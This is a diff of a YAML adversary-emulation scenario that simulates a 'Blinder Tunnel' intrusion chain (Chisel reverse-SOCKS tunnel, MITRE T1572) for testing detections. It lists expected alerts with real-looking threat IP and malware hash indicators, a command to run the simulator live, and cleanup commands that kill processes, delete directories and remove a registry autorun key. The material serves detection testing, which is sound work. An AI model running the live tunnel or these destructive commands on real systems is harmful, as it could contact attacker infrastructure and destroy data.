+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/cortexsim-mp025-tunnel.yml --live
+    identity: container-runtime
+    mitre_technique: "T1572"
+    causality:
+      parent_step: step-07
+      pivot: endpoint_network_stitch
+    platforms: ["linux", "container"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "Abnormal recurring communications from the run host to a fleet-rare destination (an IP-literal host, 91.107.156.29) — the long-lived Chisel reverse-SOCKS tunnel cadence on panw_ngfw_traffic_raw, anchored to src_host."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "abioc-mp-025-recurring-tunnel-sessions-to-a-rare-ip-literal-destination"
+      - plane: NDR
+        type: IOC
+        description: "NGFW traffic from the run host to 91.107.156.29 matches the Unit 42 Blinder Tunnel tunneling-endpoint indicator."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "ioc-ipv4-91-107-156-29"
+      - plane: NDR
+        type: IOC
+        description: "WildFire malicious verdict on the Blackwood archive (sha256 7cc571ac...) in panw_ngfw_threat_raw for the run host matches the Unit 42 hash."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "ioc-file-sha256-7cc571aca6d8715d9aaad3d83e1bcd30467565d583db1dfe73697c5d00a1f875"
+      - plane: NDR
+        type: IOC
+        description: "WildFire malicious verdict on Blackwood.dll (sha256 76273382...) in panw_ngfw_threat_raw for the run host matches the Unit 42 hash."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "ioc-file-sha256-76273382e4252c1f60a2251141e108942494409c759358320735891762c0682e"
+      - plane: ANALYTICS
+        type: Correlation
+        description: "CR-MP-0025 stitches the endpoint lineage BIOCs, the GitHub-API cadence ABIOC and the tunnel / WildFire NGFW alerts on the shared src_host inside 900 s into ONE Blinder Tunnel incident."
+        ttp_ref: "TTP-2026-0184"
+        detection_id: "CR-MP-0025"
+
+cleanup:
+  commands:
+    - "for h in /home/* \"$HOME\"; do rb=\"$h/.local/share/Microsoft/RuntimeBrokers\"; if grep -qs cortexsim-mp025 \"$rb/RuntimeBroker.exe.config\"; then pkill -f \"$rb/RuntimeBroker.exe\"; rm -rf \"$rb\"; fi; a=\"$h/.config/autostart/MicrosoftRuntime.desktop\"; grep -qs cortexsim-mp025 \"$a\" && rm -f \"$a\"; p=\"$h/source/repos/DubaiAirport_Carrers_IT_Test\"; if grep -qs 'CortexSim SAFE-MODE replica' \"$p/FlightManager/FlightManager.csproj\"; then rm -rf \"$p\" \"$h/Downloads/DubaiAirport_Carrers_IT_Test.zip\"; fi; done; true"
+    - "command -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command '$rb = Join-Path $env:LOCALAPPDATA \"Microsoft\\RuntimeBrokers\"; $run = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"; if (Select-String -Quiet -SimpleMatch -Pattern cortexsim-mp025 -Path (Join-Path $rb \"RuntimeBroker.exe.config\") -ErrorAction SilentlyContinue) { $v = (Get-ItemProperty -Path $run -Name MicrosoftRuntime -ErrorAction SilentlyContinue).MicrosoftRuntime; if ($v -like \"*\\Microsoft\\RuntimeBrokers\\RuntimeBroker.exe*\") { Remove-ItemProperty -Path $run -Name MicrosoftRuntime -ErrorAction SilentlyContinue }; Get-Process -Name RuntimeBroker -ErrorAction SilentlyContinue | Where-Object { $_.Path -like \"$rb\\*\" } | Stop-Process -Force -ErrorAction SilentlyContinue; Remove-Item -Recurse -Force -Path $rb -ErrorAction SilentlyContinue }' || true"
+    - "rm -rf /tmp/cortexsim-mp025"
+    - "rm -f /tmp/cortexsim-mp025-github.yml /tmp/cortexsim-mp025-tunnel.yml"
+
+author: "Henry Reed"
+created: "2026-10-27"
+last_updated: "2026-10-27"
+tags:
+  - unit42
+  - stitched-chain
+  - "actor:CL-STA-1178"
+  - blinder-tunnel
+  - github-c2
+  - developer-lure
+  - msbuild
+  - appdomainmanager
+  - chisel
+  - real-ioc-dns-lookup
+  - eal-plugin
